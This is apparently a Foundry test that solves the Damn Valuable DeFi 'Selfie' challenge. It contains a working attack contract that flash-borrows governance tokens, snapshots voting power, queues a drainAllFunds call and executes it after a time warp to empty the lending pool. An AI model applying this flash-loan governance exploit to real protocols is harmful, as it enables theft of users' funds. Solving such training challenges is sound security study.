// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

contract AttackLendingPool {
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    uint256 actionID;
    address owner;

    constructor(address _selfiePool, address _simpleGovernance) {
        owner = msg.sender;
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
    }

    function attack(uint256 amount) public {
        selfiePool.flashLoan(amount);
    }

    function startGovernAction() public {
        simpleGovernance.executeAction(actionID);
    }

    function receiveTokens(address token, uint256 amount) external {
        DamnValuableTokenSnapshot(token).snapshot();
        actionID = simpleGovernance.queueAction(
            address(selfiePool), abi.encodeWithSignature("drainAllFunds(address)", owner), 0
        );
        DamnValuableTokenSnapshot(token).transfer(address(selfiePool), amount);
    }

    receive() external payable {}
}

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(address(dvtSnapshot), address(simpleGovernance));

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker);
        AttackLendingPool attack = new AttackLendingPool(address(selfiePool), address(simpleGovernance));
        attack.attack(TOKENS_IN_POOL);
        vm.warp(block.timestamp + 2 days);
        attack.startGovernAction();
        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}
